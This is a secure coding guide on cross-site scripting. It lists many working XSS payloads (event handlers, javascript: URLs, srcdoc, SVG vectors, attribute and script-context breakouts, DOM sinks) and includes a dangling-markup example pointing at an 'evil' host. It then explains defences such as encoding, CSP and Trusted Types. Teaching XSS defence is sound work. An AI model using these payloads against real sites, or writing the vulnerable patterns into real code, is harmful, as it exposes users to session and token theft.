# Cross-Site Scripting (XSS) on Modern Browsers: A Secure Coding Guide

> Purpose: teach developers to recognise XSS sinks and write code that is not vulnerable. Test payloads only on applications you own or are authorised to test.

## 1. What is XSS?

XSS happens when an application places **untrusted data** into a page in a way that the browser interprets it as **code** instead of **text**. The attacker's script runs with the victim's origin, so it can read cookies (if not `HttpOnly`), call APIs as the user, modify the page, or steal tokens from `localStorage`.

| Type | Where the payload travels | Example |
|---|---|---|
| Reflected | Request -> immediate response | `/search?q=<payload>` echoed in the page |
| Stored | Saved in DB -> served to other users | Comment, profile name |
| DOM-based | Never leaves the browser; JS reads a source and writes to a sink | `location.hash` -> `innerHTML` |

Every XSS bug is **source -> (missing encoding) -> sink**.

## 2. Why `<script>` "doesn't run" (and what is actually true)

A common claim is that `<script>` no longer works since HTML5. The accurate statement is narrower:

**Scripts inserted after page load through `innerHTML`, `outerHTML`, or `insertAdjacentHTML` are not executed.** This is defined in the HTML5 parsing specification: when the fragment parser creates a `<script>` element, it sets the element's *"already started"* flag, so it is never run when later inserted into the DOM.

```js
// Does NOT execute the script
document.getElementById('out').innerHTML = '<script>alert(1)<\/script>';
```

Reasons the spec was designed this way:

- Fragment parsing via `innerHTML` is used for templating; running scripts implicitly was considered unsafe and surprising.
- It prevents a large class of trivial DOM XSS cases and makes behaviour consistent across browsers.

What this does **not** mean:

- A `<script>` tag in the **initial server-rendered HTML** still executes. Reflected/stored XSS with `<script>` still works on every browser if output is not encoded.
- It is **not a defence**. Every other vector below executes through `innerHTML`, so blocking `<script>` gives no real protection.
- `document.write()`, `createElement('script')` + append, and `eval`-style sinks still run code.

## 3. Methods that still execute on modern browsers

All examples below assume untrusted input reaches HTML unencoded.

### 3.1 Event-handler attributes (works through `innerHTML`)

Any element that can fire an event can carry JavaScript.

```html
<img src="does-not-exist" onerror="alert('XSS!')">
<svg onload="alert(1)">
<body onload="alert(1)">
<iframe onload="alert(1)"></iframe>
<video><source onerror="alert(1)"></video>
<audio src onerror="alert(1)">
<input autofocus onfocus="alert(1)">
<select autofocus onfocus="alert(1)"></select>
<textarea autofocus onfocus="alert(1)"></textarea>
<details open ontoggle="alert(1)">
<marquee onstart="alert(1)">
<div style="animation-name:x" onanimationstart="alert(1)">   <!-- needs a matching @keyframes x -->
```

Needs user interaction (still common in stored XSS):

```html
<div onclick="alert(1)">Click me</div>
<div onmouseover="alert(1)">Hover me</div>
<a href="#" onfocus="alert(1)" tabindex="0">link</a>
```

Lesson: **the attacker does not need `<script>`; any tag plus any `on*` attribute is enough.**

### 3.2 `javascript:` URLs

```html
<a href="javascript:alert(1)">Click</a>
<iframe src="javascript:alert(1)"></iframe>
<form action="javascript:alert(1)"><button>Submit</button></form>
<button formaction="javascript:alert(1)" form="f">Go</button>
<embed src="javascript:alert(1)">
<object data="javascript:alert(1)"></object>
```

Navigations from `<a>` and top-level `location` assignments are often handled differently across browsers, but `href`, `formaction`, and `iframe src` remain exploitable. Any place where user input becomes a URL (`href`, `src`, `action`, `location.href = x`, `window.open(x)`) must be scheme-validated.

### 3.3 `data:` URLs and `srcdoc`

```html
<iframe srcdoc="<script>alert(1)</script>"></iframe>
<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>
```

`srcdoc` content is parsed as a new document, so `<script>` **does** run there. Top-level navigation to `data:text/html` is blocked by modern browsers, but `data:` inside frames and some `object/embed` uses can still be a problem in specific contexts.

### 3.4 Breaking out of an attribute

If input is placed in an attribute without quote encoding:

```html
<input value="USER_INPUT">
```

Payload: `" autofocus onfocus="alert(1)`

Result:

```html
<input value="" autofocus onfocus="alert(1)">
```

Unquoted attributes are worse: a single space is enough to inject a new attribute.

### 3.5 Breaking out of a JavaScript context

```html
<script>
  var name = "USER_INPUT";
</script>
```

Payload: `";alert(1);//` or `</script><img src=x onerror=alert(1)>`

The HTML parser finds `</script>` before JavaScript is parsed, so closing the tag works even inside a JS string. HTML encoding is **not** the right defence here; use JSON serialisation with `<` escaped (`\u003c`) or avoid inline data altogether.

### 3.6 Template literal / inline handler contexts

```html
<button onclick="doThing('USER_INPUT')">
```

Payload: `');alert(1);//` . Attribute values are HTML-decoded before JS is parsed, so `&#39;` still produces a quote that breaks the string.

### 3.7 SVG and MathML

```html
<svg><script>alert(1)</script></svg>      <!-- executes when parsed with the document -->
<svg><a xlink:href="javascript:alert(1)"><text x="0" y="15">click</text></a></svg>
<svg><animate onbegin="alert(1)" attributeName="x" dur="1s">
<math><mtext><img src=x onerror=alert(1)></mtext></math>
```

SVG files served as `image/svg+xml` and opened directly also run script. Uploaded SVGs are a frequent stored XSS source.

### 3.8 DOM XSS sinks

JavaScript APIs that turn strings into HTML or code:

```js
// HTML sinks
el.innerHTML = input;            // event handlers still run
el.outerHTML = input;
el.insertAdjacentHTML('beforeend', input);
document.write(input);           // <script> DOES run here
document.writeln(input);
Range.createContextualFragment(input);  // <script> DOES run when inserted
new DOMParser().parseFromString(input, 'text/html');  // safe until inserted via innerHTML etc.

// Code sinks
eval(input);
new Function(input)();
setTimeout(input, 0);            // string form
setInterval(input, 1000);        // string form
script.text = input;             // or script.textContent / script.src = input
```

Common sources: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage` data, `localStorage`, and API responses.

Example vulnerable code:

```js
const name = new URLSearchParams(location.search).get('name');
document.querySelector('#welcome').innerHTML = 'Hello ' + name;
// /?name=<img src=x onerror=alert(1)>
```

### 3.9 Framework escape hatches

Frameworks encode by default; XSS appears when developers opt out.

| Framework | Dangerous API |
|---|---|
| React | `dangerouslySetInnerHTML`, `href={userInput}` |
| Vue | `v-html`, `:href="userInput"` |
| Angular | `[innerHTML]` with `bypassSecurityTrust*`, template injection |
| jQuery | `$(input)`, `.html(input)`, `.append(input)` with HTML strings |
| Server templates | `\| safe`, `{!! !!}`, `@Html.Raw`, `<%- %>` |

### 3.10 Mutation XSS (mXSS)

Sanitisers parse HTML, check it, and serialise it back; the browser then parses the serialised string differently, producing executable markup from "safe" output. Typical triggers involve `<noscript>`, `<style>`, `<svg>`/`<math>` namespace confusion, and unusual nesting. Lesson: use a maintained sanitiser (DOMPurify) and keep it updated; never write regex-based filters.

### 3.11 Other vectors

- **Dangling markup / CSS injection**: not script execution, but can exfiltrate CSRF tokens (`<img src='https://evil/?` swallowing following HTML).
- **`<base href>` injection**: redirects relative script URLs to an attacker host.
- **JSONP and open script gadgets**: allow-listed domains in CSP that host callbacks or libraries (old AngularJS) bypass policy.
- **File upload / content-type confusion**: HTML or SVG served from your origin with a sniffable type.
- **Client-side prototype pollution** leading to script gadgets.

## 4. Why filters and blocklists fail

- Hundreds of tags and 100+ event handlers exist; new ones are added to the platform.
- Parsers are forgiving: `<img/src=x/onerror=alert(1)>`, mixed case, null-like whitespace, entity encoding, and broken tags are all accepted.
- Different decoding layers (URL, HTML, JS) allow multi-step encoding.

Blocking `<script>` or the word `onerror` is therefore a bypass exercise, not a defence.

## 5. How to defend

### 5.1 Encode output for the context

| Context | Correct treatment |
|---|---|
| HTML body | HTML-encode `& < > " '` |
| HTML attribute | Encode and **always quote** attributes |
| JavaScript data | `JSON.stringify` + escape `<`, or put in a `data-*` attribute / `<script type="application/json">` |
| URL | Validate scheme allow-list (`https:`, `http:`, `mailto:`), then URL-encode parameters |
| CSS | Avoid user input; allow-list values |

### 5.2 Use safe DOM APIs

```js
// Vulnerable
el.innerHTML = userInput;

// Safe: treated as text
el.textContent = userInput;

// Safe: build elements
const a = document.createElement('a');
a.textContent = label;
if (new URL(url, location.origin).protocol === 'https:') a.href = url;
```

If HTML is required, sanitise:

```js
el.innerHTML = DOMPurify.sanitize(userHtml);
```

Or use the Sanitizer API / Trusted Types where supported.

### 5.3 Content Security Policy (defence in depth)

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-{random-per-response}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'self';
  require-trusted-types-for 'script'
```

- Blocks inline handlers and `javascript:` URLs unless explicitly allowed.
- Avoid `'unsafe-inline'` and `'unsafe-eval'`.
- Nonces must be unpredictable and unique per response.
- CSP reduces impact; it does not replace encoding.

### 5.4 Trusted Types

Makes dangerous sinks (`innerHTML`, `eval`, `script.src`) reject plain strings, forcing all data through a reviewed policy. This is the strongest browser-enforced defence against DOM XSS.

### 5.5 Cookie and platform hardening

- `HttpOnly`, `Secure`, and `SameSite` on session cookies.
- `X-Content-Type-Options: nosniff`.
- Serve user uploads from a separate origin, with `Content-Disposition: attachment` where possible.
- Do not store tokens in `localStorage` if avoidable.

### 5.6 Development practice

- Prefer frameworks' default bindings; ban `dangerouslySetInnerHTML`, `v-html`, `.html()` via lint rules (for example `eslint-plugin-no-unsanitized`, `react/no-danger`).
- Treat every source as untrusted, including your own API and database.
- Add XSS cases to code review checklists and automated tests (SAST/DAST).

## 6. Quick reference checklist

- [ ] Output is encoded for its exact context
- [ ] No `innerHTML`/`document.write`/`eval` with untrusted data
- [ ] All attributes are quoted
- [ ] URLs validated against a scheme allow-list
- [ ] User HTML sanitised with a maintained library
- [ ] Strict CSP with nonces and Trusted Types
- [ ] Cookies `HttpOnly`, `Secure`, `SameSite`
- [ ] Framework unsafe APIs are linted and reviewed

## 7. Further reading

- OWASP XSS Prevention Cheat Sheet
- OWASP DOM based XSS Prevention Cheat Sheet
- HTML Living Standard: scripting and `innerHTML` parsing behaviour
- MDN: Content Security Policy, Trusted Types API
